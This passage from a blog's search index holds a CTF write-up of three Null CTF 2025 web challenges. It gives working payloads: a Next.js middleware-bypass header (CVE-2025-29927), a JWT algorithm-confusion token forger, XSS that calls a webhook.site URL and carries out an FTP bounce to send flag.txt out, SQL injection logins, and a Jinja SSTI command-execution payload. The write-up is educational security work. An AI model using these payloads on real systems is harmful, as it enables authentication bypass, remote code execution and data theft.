2025\u0026rsquo;s Connection Tester SQLi chain and Trust Fall IDOR/API issues.","title":"Patriot CTF 2025: Web Challenges"},{"content":"Intro I participated in this CTF with PulsaDeCyber. Unfortunately I was busy most of the time, so I only had time to solve 3 challenges, that were easy-medium.\nChallenge: Next Jason - Easy Analysis By opening the source code, I immediately booted up the docker container, so I can play with stuff locally without too much infrastructure-stuff going on. First thing I realized is there is a next.js app that is using some middleware, specified for all /api/*. By going into the website we get a regular login page:\nAfter checking the installed next.js version, I verified # CVE-2025-29927 in the given code.\nThe simple bypass for the middleware will be adding the next header to our /api/* requests: x-middleware-subrequest: \u0026quot;middleware:middleware:middleware:middleware:middleware\u0026quot;\nLet\u0026rsquo;s look at package.json: Both next.js and jsonwebtoken libraries are out of version. The catch is to look for an easy jwt misconfiguration.\nLet\u0026rsquo;s look at the code!\n/token/verify I wont show the whole route, but the main function is verifyToken, which returns the payload for the token if it is valid, by decrypting it using the public key of a randomly generated RSA. It uses both RS256 and HS256 to verify, which is weird. But let\u0026rsquo;s continue!\n/token/sign Well, all this code does is to sign the given payload ( which here is basically {username: string} ) to a jwt token. Also, we cannot sign as admin, so we can\u0026rsquo;t get the admin\u0026rsquo;s token.\nWe have a few more routes in the api, which will be used after the middleware bypass:\n/api/getFlag - returns flag after running /token/verify and checks if we are admin (not usable for now) /api/getPublicKey - returns the RSA\u0026rsquo;s private key. Great achievement. /api/login - just generates a jwt token using /token/sign and filters us from being admin, not usable at all. We can achieve the public key! that\u0026rsquo;s great news. As I was looking for jwt vulnerabilities, I found this article. At the exact \u0026ldquo;Algorithm Confusion\u0026rdquo; title, we can see a case we have in this code. We first sign the payload using RS256, and we verify it with both HS256 or RS256.\nThe way they exploit this in the article is by signing the token using HS256, and the public key as the secret, and it works!\nSo, let\u0026rsquo;s try!\nExploit After fetching the public key, I wrote this js code to generate a new token\nconst jwt = require(\u0026#34;jsonwebtoken\u0026#34;); const {readFileSync} = require(\u0026#34;fs\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const PUBKEY = require(\u0026#34;./pubkey.json\u0026#34;).PUBKEY; const payload = { username: \u0026#39;admin\u0026#39; }; const token = jwt.sign(payload, PUBKEY, { algorithm: \u0026#39;HS256\u0026#39;}) console.log(token); // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw Next, I wrote a simple python script that will fetch the flag using the new admin token, and the middleware bypass:\nr = requests.get(\u0026#39;http://75cb8a82a9d8.challs.ctf.r0devnull.team:8001/api/getFlag\u0026#39;, headers={ \u0026#34;x-middleware-subrequest\u0026#34;: \u0026#34;middleware:middleware:middleware:middleware:middleware\u0026#34; }, cookies={ \u0026#39;token\u0026#39;: \u0026#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzY0OTUzMDk1fQ.4pG_xYmHYcKNSBIplBKlLQ0eNL-fi0Yp3Fb6kwXI6sw\u0026#39; }) print(r.text) Flag: nullctf{f0rg3_7h15_cv3_h3h_c1caa1a23b5c568d} Challenge: ftp-db - Medium Analysis This challenge has 3 services.\nFrontend - next.js, nothing special. A note from the authors mentioned there is nothing special in the frontend. Contacts the backend by using a server component in next.js. FTP (file transfer protocol) - initializes an FTP server using python\u0026rsquo;s pyftpdlib. Note: enables permit_foreign_addresses which allows us to use active mode to send data streams. through a foreign server ( will explain later :) ) . Backend - rust \u0026amp; rocket, contacts the ftp server. So we cannot send requests to ftp or backend, since they are both locally on the container, no open ports.\nLet\u0026rsquo;s open the app:\nThis is a classic notes app. Backend stores notes in the FTP server. Let\u0026rsquo;s check the code.\nnothing really special for creating a note, I wanna look at the code for the search page.\n\u0026lt;div className=\u0026#34;font-mono w-full p-2 text-sm bg-green-900 rounded border border-green-800\u0026#34; dangerouslySetInnerHTML={{ __html: searchResult.result, }} /\u0026gt; We can see the search page injects the page\u0026rsquo;s HTML with the note\u0026rsquo;s content. This is an XSS.\nWe also have a \u0026ldquo;Report to admin\u0026rdquo; button, which opens a webdriver on a specific note, this can trigger the admin to enter our custom note and get injected by our payload.\nLet\u0026rsquo;s validate our theory by making the admin send a message to my webhook:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;https://webhook.site/9fe988d0-b53c-451d-9dd5-1febc0179031\u0026#34;, {method: \u0026#34;POST\u0026#34;, mode: \u0026#34;no-cors\u0026#34;}).then((r) =\u0026gt; r.text())})()\u0026#39;\u0026gt; Next step was to figure out how can I actually inject an XSS that will lead us to get flag.txt from the ftp server.\nIt was quite exhausting, but after asking some advice, my friend Harel told me about FTP Bounce Attack, that allows us to make the ftp server connect via active mode to a foreign machine, and send the requested data there.\nExploit To actually use this attack, I found a way to manipulate the CRLF by just sending a raw string body using a POST request, so the body will be in the bottom of the request, and not in the URL header. Locally, I tried the next thing:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\n\u0026#34;, mode: \u0026#34;no-cors\u0026#34;})})()\u0026#39;\u0026gt; by seeing the FTP logs. It actually worked. The admin opened a connection to the ftp server, sent him some unknown commands (the HTTP headers lol), and sent him the body, that was injected with FTP commands.\nI booted up a proxy server with a script I wrote (Check it out). And tried the next payload on the original website:\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\nTYPE A\\r\\nPORT \u0026lt;ip,port\u0026gt;\\r\\nRETR flag.txt\\r\\n\u0026#34;})})()\u0026#39;\u0026gt; But I didn\u0026rsquo;t get any connection to my proxy server.\nAfter figuring it out for a while, I tried adding no-cors and waiting for the promise to finish (using .then).\n\u0026lt;img src=x onerror=\u0026#39;(()=\u0026gt;{fetch(\u0026#34;http://ftp:2121\u0026#34;, {method: \u0026#34;POST\u0026#34;, body:\u0026#34;USER anonymous\\r\\nPASS anonymous\\r\\nTYPE A\\r\\nPORT \u0026lt;ip,port\u0026gt;\\r\\nRETR flag.txt\\r\\n\u0026#34;, mode: \u0026#34;no-cors\u0026#34;}).then((r) =\u0026gt; r.text())})()\u0026#39;\u0026gt; And it worked!\nFlag: nullctf{ftp_15_7h3_b357_d474b453} Credits: Thomas Goldman - we solved this challenge together as teammates. Challenge: s1mple - Easy Analysis There was no source code for this challenge, although the solution was pretty easy.\nFirst is this admin page, after trying basic SQLI payload (' OR 1=1;--), I was logged in as admin. We are given this dashboard, which isn\u0026rsquo;t really helpful since you cannot really do anything here. I tried writing an SQLI payload on the search, which didn\u0026rsquo;t work. And later on I tried SSTI, nothing worked.\nSo I tried logging in as a different user: ' OR 1=1 AND USERNAME != 'admin';-- we are logged in as user!\nLet\u0026rsquo;s try an SQLI query: Okay, let\u0026rsquo;s try a basic SSTI: Perfect.\nnow let\u0026rsquo;s try to read a file:\n{{request[\u0026#39;application\u0026#39;][\u0026#39;__globals__\u0026#39;][\u0026#39;__builtins__\u0026#39;][\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;)[\u0026#39;popen\u0026#39;](\u0026#39;cat flag.txt\u0026#39;)[\u0026#39;read\u0026#39;]()}} It was really simple!\nFlag: nullctf{1nd33d_1t_w4s_th4t_s1mpl3} ","permalink":"//localhost:1313/posts/null-ctf-2025-web-challenges/","summary":"Notes from the Null CTF 2025 web challenges covering Next Jason\u0026rsquo;s auth bypass and JWT abuse.","title":"Null CTF 2025: Web Challenges"},{"content":"This blog collects concise notes and walkthroughs from recent web security and CTF challenges.\nWhat to expect:\nHighlighted attack paths, payloads, and fixes. Quick repro steps with code snippets. Links to resources and tools that helped along the way. If you want to jump straight to the posts list, use the buttons on the home page or the navigation bar. New writeups will appear here as they ship.\n","permalink":"//localhost:1313/posts/welcome/","summary":"What to expect from this collection of web security and CTF writeups.","title":"Welcome"}]